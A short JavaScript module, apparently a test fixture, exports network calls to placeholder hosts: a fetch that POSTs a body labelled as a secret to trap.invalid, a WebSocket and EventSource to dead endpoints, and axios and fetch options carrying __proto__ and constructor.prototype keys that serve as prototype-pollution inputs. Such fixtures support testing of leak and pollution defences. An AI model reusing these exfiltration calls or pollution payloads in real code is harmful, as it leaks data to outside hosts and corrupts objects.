import axios from "axios";

export const collect = () => fetch("http://trap.invalid/collect", { method: "POST", body: JSON.stringify({ secret: "do-not-leak-body" }) });
export const socket = new WebSocket("ws://trap.invalid/socket");
export const events = new EventSource("http://127.0.0.1:9/events");
export const client = axios.create({ baseURL: "https://api.example.test", __proto__: { timeout: 1 }, constructor: { prototype: { polluted: "axios" } } });
export const polluting = () => fetch("https://api.example.test/x", { headers: { __proto__: { polluted: "headers" }, Authorization: "Bearer do-not-leak-header" } });
